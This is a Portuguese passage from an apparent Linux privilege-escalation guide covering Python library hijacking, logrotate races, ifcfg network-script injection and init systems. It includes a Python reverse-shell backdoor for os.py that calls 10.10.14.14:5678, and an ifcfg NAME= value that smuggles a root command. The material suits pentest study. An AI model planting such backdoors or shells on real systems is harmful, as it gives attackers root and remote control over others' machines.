Você também deve verificar arquivos que contenham a palavra "**password**" em seu **nome** ou dentro do **conteúdo**, e também verificar IPs e emails dentro de logs, ou expressões regulares de hashes.\
Não vou listar aqui como fazer tudo isso, mas se você estiver interessado, pode verificar as últimas verificações que o [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) realiza.

## Arquivos Graváveis

### Sequestro de Biblioteca Python

Se você souber de **onde** um script python será executado e **puder escrever dentro** dessa pasta ou **modificar bibliotecas python**, você pode modificar a biblioteca do sistema operacional e inserir um backdoor (se puder escrever onde o script python será executado, copie e cole a biblioteca os.py).

Para **inserir um backdoor na biblioteca**, basta adicionar no final da biblioteca os.py a seguinte linha (altere o IP e a PORTA):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Exploração do Logrotate

Uma vulnerabilidade no `logrotate` permite que usuários com **permissões de escrita** em um arquivo de log ou em seus diretórios pai potencialmente obtenham privilégios elevados. Isso ocorre porque o `logrotate`, frequentemente em execução como **root**, pode ser manipulado para executar arquivos arbitrários, especialmente em diretórios como _**/etc/bash_completion.d/**_. É importante verificar as permissões não apenas em _/var/log_, mas também em qualquer diretório onde a rotação de logs seja aplicada.

{% hint style="info" %}
Essa vulnerabilidade afeta a versão `3.18.0` e anteriores do `logrotate`
{% endhint %}

Mais informações detalhadas sobre a vulnerabilidade podem ser encontradas nesta página: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Você pode explorar essa vulnerabilidade com [**logrotten**](https://github.com/whotwagner/logrotten).

Essa vulnerabilidade é muito semelhante à [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logs do nginx)**, então sempre que você perceber que pode alterar logs, verifique quem está gerenciando esses logs e veja se é possível elevar os privilégios substituindo os logs por links simbólicos.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Referência da vulnerabilidade:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

Se, por qualquer motivo, um usuário conseguir **escrever** um script `ifcf-<qualquer_coisa>` em _/etc/sysconfig/network-scripts_ **ou** puder **ajustar** um existente, então seu **sistema está comprometido**.

Os scripts de rede, como _ifcg-eth0_, por exemplo, são usados para conexões de rede. Eles se parecem exatamente com arquivos .INI. No entanto, eles são \~sourced\~ no Linux pelo Network Manager (dispatcher.d).

No meu caso, o atributo `NAME=` nesses scripts de rede não é tratado corretamente. Se você tiver **espaço em branco no nome, o sistema tenta executar a parte após o espaço em branco**. Isso significa que **tudo após o primeiro espaço em branco é executado como root**.

Por exemplo: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd e rc.d**

O diretório `/etc/init.d` é o lar de **scripts** para o System V init (SysVinit), o **sistema clássico de gerenciamento de serviços do Linux**. Ele inclui scripts para `start`, `stop`, `restart` e às vezes `reload` de serviços. Esses scripts podem ser executados diretamente ou por meio de links simbólicos encontrados em `/etc/rc?.d/`. Um caminho alternativo em sistemas Redhat é `/etc/rc.d/init.d`.

Por outro lado, `/etc/init` está associado ao **Upstart**, um sistema mais recente de **gerenciamento de serviços** introduzido pela Ubuntu, usando arquivos de configuração para tarefas de gerenciamento de serviços. Apesar da transição para o Upstart, os scripts do SysVinit ainda são utilizados juntamente com as configurações do Upstart devido a uma camada de compatibilidade no Upstart.

**systemd** surge como um moderno inicializador e gerenciador de serviços, oferecendo recursos avançados como inicialização sob demanda de daemons, gerenciamento de automontagem e snapshots do estado do sistema. Ele organiza arquivos em `/usr/lib/systemd/` para pacotes de distribuição e em `/etc/systemd/system/` para modificações de administradores, simplificando o processo de administração do sistema.
